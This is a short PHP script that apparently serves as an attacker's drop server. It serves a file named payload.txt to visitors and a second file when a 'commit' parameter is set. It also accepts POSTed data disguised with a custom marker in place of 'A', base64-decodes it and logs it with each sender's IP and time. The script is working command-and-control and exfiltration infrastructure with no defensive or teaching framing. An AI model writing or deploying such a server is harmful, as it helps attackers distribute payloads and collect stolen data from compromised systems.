<?php
$downloadArg = "commit";
$request = (object)array();

if($_SERVER['REQUEST_METHOD'] === "POST") {
        $request->data = file_get_contents("php://input");
        $request->ip = $_SERVER["REMOTE_ADDR"];
        $request->time = date("r");

        $data = str_replace("!)(*&#:<]", "A", $request->data);
        $decoded = base64_decode($data);

        file_put_contents("/tmp/output.txt", "[" . $request->time . "](" . $request->ip . "): " . $decoded . "\r\n", FILE_APPEND);
} else if(isset($_GET[$downloadArg])) {
        echo file_get_contents("/tmp/download.txt");
} else {
        echo file_get_contents("/tmp/payload.txt");
}
?>
